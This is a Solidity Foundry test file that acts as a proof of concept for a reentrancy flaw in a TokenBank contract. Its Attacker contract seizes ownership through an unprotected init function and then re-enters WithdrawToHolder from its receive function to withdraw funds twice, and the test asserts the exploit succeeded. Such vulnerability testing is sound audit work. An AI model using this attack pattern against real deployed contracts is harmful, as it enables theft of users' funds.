
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // Ensure attackVal is greater than MinDeposit (1 ether) and large enough to split.
        vm.assume(attackVal > 2 ether);
        vm.assume(attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific pre-condition needed here as Attacker handles setup.

        // --- 3. Funding ---
        // Fund the test contract so it can pass value to the attacker.
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = TokenBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedVal = val;
        
        // 1. Hijack ownership to bypass onlyOwner modifier on WithdrawToHolder
        victim.initTokenBank();
        
        // 2. Deposit funds to establish credit in Holders mapping
        // This is necessary because WithdrawToHolder checks Holders[_addr] > 0
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State (Implicitly handled by logic flow)

        // 2. Call the vulnerable function.
        // We withdraw half the amount. The re-entrant call will withdraw the other half.
        // This strategy avoids the Solidity 0.8.x underflow revert while proving reentrancy is possible.
        victim.WithdrawToHolder(address(this), val / 2);

        // 3. Verify Success Conditions.
        if (attackCallCount > 0) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract
            victim.WithdrawToHolder(address(this), storedVal / 2);
        }
    }
}
